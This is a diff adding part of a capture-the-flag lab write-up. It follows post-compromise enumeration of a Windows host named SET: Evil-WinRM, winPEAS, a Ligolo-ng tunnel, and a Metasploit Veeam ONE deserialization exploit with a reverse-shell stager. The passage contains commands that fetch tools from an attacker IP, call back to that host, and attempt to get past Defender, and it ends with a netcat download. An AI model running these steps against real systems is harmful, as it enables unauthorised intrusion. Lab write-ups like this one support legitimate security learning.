@@ -1142,7 +1142,195 @@ Using these credentials we can access get a remote shell:
           Info: Establishing connection to remote endpoint
           *Evil-WinRM* PS C:\Users\MichelleWat\Documents> 
 
+<b>Note that SET IP has changed again.</b>
+Once logged in we I started to fingerprint the host machine. Executing 
+          
+          Get-ComputerInfo -Property "os*"
 
+Just freezed the active shell (I had to interrupt the session).
+
+          Get-MpComputerStatus
+
+Return access denied. Then I tried to get some info about the user:
+
+          whoami /all
+
+          USER INFORMATION
+          ----------------
+          
+          User Name       SID
+          =============== =============================================
+          set\michellewat S-1-5-21-2146754214-159084425-2869734154-2014
+          
+          
+          GROUP INFORMATION
+          -----------------
+          
+          Group Name                             Type             SID          Attributes
+          ====================================== ================ ============ ==================================================
+          Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+          BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+          BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+          NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+          NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+          NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+          NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+          NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+          Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
+          
+          
+          PRIVILEGES INFORMATION
+          ----------------------
+          
+          Privilege Name                Description                    State
+          ============================= ============================== =======
+          SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+          SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+Nothing really useful emerged to try to escalate our privilege. Proceeding with list active services:
+
+          netstat -anon
+
+          Active Connections
+          
+            Proto  Local Address          Foreign Address        State           PID
+            TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+            TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       972
+            TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
+            TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+            TCP    0.0.0.0:2805           0.0.0.0:0              LISTENING       3100
+            TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       532
+            TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+            TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+            TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       684
+            TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1032
+            TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       632
+            TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       776
+            TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       1356
+            TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       760
+            ...
+
+Actully reveals that there are some services that are not esternally exposed. To fingerprint these service from the attacker machine a I used my favourite tool: Ligolo-ng. 
+First download the agent on SET from our attacker machine:
+
+          invoke-webrequest http://10.9.1.97:8000/agent.exe -outfile agent.exe
+          *Evil-WinRM* PS C:\Users\MichelleWat\Documents> dir
+          Directory: C:\Users\MichelleWat\Documents
+
+          Mode                LastWriteTime         Length Name
+          ----                -------------         ------ ----
+          -a----         7/5/2024  12:56 AM        4863488 agent.exe
+
+          
+Then on the attacker machine setup and start the proxy (execute the commands as root):
+
+          ip tuntap add user root  mode tun ligolo && ip link set ligolo up 
+          ip link set ligolo up
+          # start the proxy
+          /opt/ligolo_proxy -selfcert 
+          ...
+          WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
+          INFO[0000] Listening on 0.0.0.0:11601  
+          
+On SET server start the agent:
+
+          *Evil-WinRM* PS C:\Users\MichelleWat\Documents> .\agent.exe -connect 10.9.1.97:11601 -ignore-cert
+          agent.exe : time="2024-07-05T01:06:41-07:00" level=warning msg="warning, certificate validation disabled"
+              + CategoryInfo          : NotSpecified: (time="2024-07-0...ation disabled":String) [], RemoteException
+              + FullyQualifiedErrorId : NativeCommandError
+          time="2024-07-05T01:06:41-07:00" level=info msg="Connection established" addr="10.9.1.97:11601"
+Then to access the local agent port we need to add the following route to our attacker machine:
+
+          sudo ip route add 240.0.0.1/32 dev ligolo
+More information about this configuration can be found [here](https://github.com/nicocha30/ligolo-ng?tab=readme-ov-file#access-to-agents-local-ports-127001). Then on ligolo console start the tunnell:
+
+          ligolo-ng » session 
+          ? Specify a session : 1 - #1 - SET\MichelleWat@SET - 10.10.24.156:49906
+          [Agent : SET\MichelleWat@SET] » tunnel_start 
+          [Agent : SET\MichelleWat@SET] » INFO[0571] Starting tunnel to SET\MichelleWat@SET 
+
+So no we can run a scan against SET using the proxied interface:
+
+          nmap -p 2805,80,3389,47001 -Pn -sVC  240.0.0.1
+          ...
+          PORT      STATE SERVICE       VERSION
+          80/tcp    open  http          Microsoft IIS httpd 10.0
+          |_http-server-header: Microsoft-IIS/10.0
+          | http-methods: 
+          |_  Potentially risky methods: TRACE
+          |_http-title: Set
+          2805/tcp  open  wta-wsp-s?
+          3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+          | rdp-ntlm-info: 
+          |   Target_Name: SET
+          |   NetBIOS_Domain_Name: SET
+          |   NetBIOS_Computer_Name: SET
+          |   DNS_Domain_Name: SET
+          |   DNS_Computer_Name: SET
+          |   Product_Version: 10.0.17763
+          |_  System_Time: 2024-07-05T08:20:04+00:00
+          | ssl-cert: Subject: commonName=SET
+          | Not valid before: 2024-07-04T07:38:54
+          |_Not valid after:  2025-01-03T07:38:54
+          |_ssl-date: 2024-07-05T08:20:07+00:00; 0s from scanner time.
+          47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+          |_http-title: Not Found
+          |_http-server-header: Microsoft-HTTPAPI/2.0
+
+With these information actually I was not able to proceed any futher. Then I tried to use winpeas to get something:
+
+          *Evil-WinRM* PS C:\Users\MichelleWat\Documents> invoke-webrequest http://10.9.1.97:8000/winPEASx64_ofs.exe -outfile wp.exe
+          *Evil-WinRM* PS C:\Users\MichelleWat\Documents> .\wp.exe
+          ...
+           Veeam ONE Agent(Veeam Software AG - Veeam ONE Agent)["C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe" -id=3be6b89b-e6de-4e97-bcd4-5c14e9d97fc1] - Autoload - isDotNet
+    Enables remediation actions and communication between Veeam ONE and monitored Veeam Backup & Replication servers.
+    ...
+    ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
+          Check for services restricted from the outside 
+            Enumerating IPv4 connections
+            Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
+          ...
+            TCP        0.0.0.0               2805          0.0.0.0               0               Listening         3100            Veeam.One.Agent.Service
+
+The only unusual active service that emerged was Veeam One agent. 
+There are some vulnerabilities around that we could try to exploit, but first we need to find the version of the software. Winpeas also foud the path to a log file:
+
+          ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ File Analysis ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+          ....
+          File: C:\Users\All Users\Veeam\OneAgent\Log\3be6b89b-e6de-4e97-bcd4-5c14e9d97fc1\OneAgent.log
+
+Inspecting the file I was not able to identify the product version. Googling a bit I found that we can get the version of Veeam agent with the next PS snippet:
+
+         (get-item "C:\program files\veeam\veeam one\veeam one agent\Veeam.One.Agent.Service.exe").VersionInfo.FileVersion
+          9.5.4.4566
+
+Now having this information I found that there is an [insecure deserialization vulnerability](https://www.rapid7.com/db/modules/exploit/windows/misc/veeam_one_agent_deserialization/) that we could try to exploit. The only exploit I foud is a MSF module, so this time I have to give up my principles and to use that module. In case you stopped the ligolo agent on SET, before to proceed, remember to start it again.
+We can verify if we can reach the target service as follows:
+
+          nmap -p 2805 -Pn 240.0.0.1   
+          ...
+          PORT     STATE SERVICE
+          2805/tcp open  wta-wsp-s
+
+Then I spent quite a lot of time trying to make the module to work, but I always failed. Debugging the module interaction:
+
+          msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set verbose true
+          verbose => true
+          msf6 exploit(windows/misc/veeam_one_agent_deserialization) > run
+          
+          [*] Started reverse TCP handler on 10.9.1.97:4444 
+          [*] 240.0.0.1:2805 - Connecting to 240.0.0.1:2805
+          [*] 240.0.0.1:2805 - Sending host info to 240.0.0.1:2805
+          [+] 240.0.0.1:2805 - --> Host info packet: "\x05\x02\x0FAgentController"
+          [+] 240.0.0.1:2805 - <-- Host info reply: "\x03\x02\x00\x00\x00\x00\x00\x93\xEF\x0F\x99\x01_\xD3C\x95}6\xF0H\bfU\x0E\x00\x00\x00\a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00"
+          [*] 240.0.0.1:2805 - Executing PowerShell Stager for windows/x64/meterpreter/reverse_tcp
+          [*] 240.0.0.1:2805 - Powershell command length: 4412
+          [*] 240.0.0.1:2805 - Executing command: powershell.exe -nop -w hidden ...
+          [*] Exploit completed, but no session was created.
+
+We can infer that the most likely cause is the PowerShell Stager being blocked by AV on SET. I tried different combinations of targets and paylod, my last attempt was to use <b>cmd/windows/http/x64/shell/reverse_tcp_rc4</b>, since I had success in the past bypassing Defender, but this time I had no luck.
+
+*Evil-WinRM* PS C:\Users\MichelleWat\Documents> invoke-webrequest http://10.9.1.97:8000/nc64.exe -outfile nc.exe
 
 
 
